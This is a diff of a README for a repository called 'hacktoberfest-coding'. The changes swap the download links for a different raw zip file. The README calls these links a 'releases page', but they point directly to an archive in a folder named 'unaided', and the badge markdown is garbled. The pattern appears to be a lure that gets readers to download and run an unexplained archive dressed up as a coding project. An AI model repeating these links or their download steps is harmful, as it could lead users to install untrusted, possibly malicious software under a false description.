@@ -1,6 +1,6 @@
 # 🎉 hacktoberfest-coding - Contribute Fun Coding Projects Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/hacktoberfest-coding.zip%20Latest%https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/hacktoberfest-coding.zip)](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/hacktoberfest-coding.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/coding-hacktoberfest-3.3.zip%20Latest%https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/coding-hacktoberfest-3.3.zip)](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/coding-hacktoberfest-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to the **hacktoberfest-coding** repository! This is a friendly space for
 To get started, you will need to download the application. Follow these steps:
 
 1. **Visit the releases page:** Click on the link below to go to the page where you can download the application.
-   [Download Latest Release](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/hacktoberfest-coding.zip)
+   [Download Latest Release](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/coding-hacktoberfest-3.3.zip)
 
 2. **Select the latest version:** On the releases page, look for the most recent version. It will usually be at the top of the list.
 
@@ -84,4 +84,4 @@ Join us for Hacktoberfest 2025! This is an annual event where developers around 
 
 Thank you for checking out hacktoberfest-coding! We hope you enjoy contributing and learning new skills. Your effort can make a big difference in the community. 
 
-Don't forget to visit our [Release Page](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/hacktoberfest-coding.zip) for the latest updates and downloads!
+Don't forget to visit our [Release Page](https://raw.githubusercontent.com/Hartt-sensei/hacktoberfest-coding/main/unaided/coding-hacktoberfest-3.3.zip) for the latest updates and downloads!
